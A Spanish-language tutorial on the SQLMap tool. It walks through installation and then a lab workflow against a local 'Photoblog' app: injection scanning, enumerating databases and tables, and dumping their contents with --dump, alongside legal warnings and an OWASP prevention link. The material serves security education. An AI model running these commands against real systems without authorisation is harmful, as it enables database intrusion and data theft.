# Tutorial de SQLMap: Comprensión de Pruebas de Inyección SQL

## Instalación

Hay varias formas de instalar SQLMap. La forma recomendada es clonar el repositorio de Git:

```bash
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
```

### Requisitos del Sistema

- SQLMap funciona perfectamente con Python versiones **2.6**, **2.7** y **3.x** en cualquier plataforma
- No requiere instalación adicional, funciona directamente después de la descarga

### Comandos Básicos de Uso

Para ver la lista de opciones básicas:

```bash
python sqlmap.py -h
```

Para ver la lista completa de todas las opciones disponibles:

```bash
python sqlmap.py -hh
```

## Requisitos Previos

- Un entorno controlado de pruebas (nunca realizar pruebas en sistemas de producción)
- Conocimiento básico de SQL y aplicaciones web
- SQLMap instalado en tu sistema

## Flujo de Trabajo Básico de SQLMap

### 1. Prueba Inicial sobre el proyecto Photoblog

```bash
sqlmap -u "http://localhost:8888/cat.php?id=*"
```

Este comando inicia un escaneo básico de la URL, donde:

- `-u` especifica la URL objetivo
- `*` marca el punto de inyección en la URL
- SQLMap probará automáticamente varias técnicas de inyección

### 2. Enumeración de Bases de Datos

```bash
sqlmap -u "http://localhost:8888/cat.php?id=*" --dbs
```

Este comando:

- Lista todas las bases de datos accesibles en el sistema objetivo
- Utiliza la opción `--dbs` para solicitar específicamente los nombres de las bases de datos
- Muestra qué bases de datos puede acceder el usuario de la aplicación web

### 3. Selección de una Base de Datos Específica

```bash
sqlmap -u "http://localhost:8888/cat.php?id=*" -D photoblog
```

Este comando:

- Se enfoca en una base de datos específica llamada "photoblog"
- Utiliza `-D` para especificar el nombre de la base de datos
- Prepara para un análisis más detallado de esta base de datos

### 4. Listado de Tablas de la Base de Datos

```bash
sqlmap -u "http://localhost:8888/cat.php?id=*" -D photoblog --tables
```

Este comando:

- Muestra todas las tablas dentro de la base de datos seleccionada
- Utiliza la opción `--tables` para enumerar las estructuras de las tablas
- Ayuda a comprender el esquema de la base de datos

### 5. Extracción de Datos

```bash
sqlmap -u "http://localhost:8888/cat.php?id=*" -D photoblog --tables --dump
```

Este comando:

- Intenta extraer todos los datos de todas las tablas
- Utiliza la opción `--dump` para recuperar el contenido real de las tablas
- Puede llevar tiempo para bases de datos grandes

## Consideraciones Importantes de Seguridad

1. **Cumplimiento Legal**: Solo usar SQLMap en sistemas que poseas o tengas permiso explícito para probar.
2. **Documentación**: Mantener registros detallados de todas las actividades de prueba.
3. **Entorno Controlado**: Siempre practicar primero en entornos de prueba aislados.
4. **Sensibilidad de Datos**: Ser cauteloso con cualquier dato expuesto y manejarlo de manera responsable.

## Mejores Prácticas

1. Comenzar con las pruebas menos intrusivas y aumentar gradualmente la complejidad
2. Utilizar la opción `--batch` para ejecución automatizada durante demostraciones educativas
3. Considerar usar `--random-agent` para variar el User-Agent durante las pruebas
4. Siempre usar `--threads` con cuidado para evitar sobrecargar el sistema objetivo

## Recursos Adicionales

- Documentación de SQLMap: https://github.com/sqlmapproject/sqlmap/wiki
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)

Recordatorio: Las pruebas de inyección SQL solo deben realizarse en entornos controlados y autorizados como parte de la educación en seguridad o evaluaciones de seguridad autorizadas.
